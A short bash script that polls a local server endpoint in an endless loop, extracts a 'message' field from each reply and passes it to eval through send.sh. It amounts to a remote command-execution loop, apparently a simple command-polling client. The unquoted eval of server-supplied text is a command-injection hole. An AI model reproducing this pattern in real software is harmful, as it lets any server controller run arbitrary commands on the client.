#!/bin/bash

#!/bin/bash

NC='\033[0m'
RED='\033[0;31m'
BLUE='\033[0;34m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'

execute_command_in_client() 
{
    local command="$1"
    local send="bash send.sh '$command'"
    eval "$send"
}

convert_from_message_to_command() 
{
    local message="$1"
    local command=$(echo "$message" | jq -r '.message')
    execute_command_in_client "$command"
}

SERVER_URL="http://0.0.0.0:8080/trigger-signal"

check_signals() 
{
    response=$(curl -s -X POST "$SERVER_URL")
    if [ ! -z "$response" ]; 
    then
        convert_from_message_to_command "$response"
    fi
}

while true; 
do
    check_signals
done
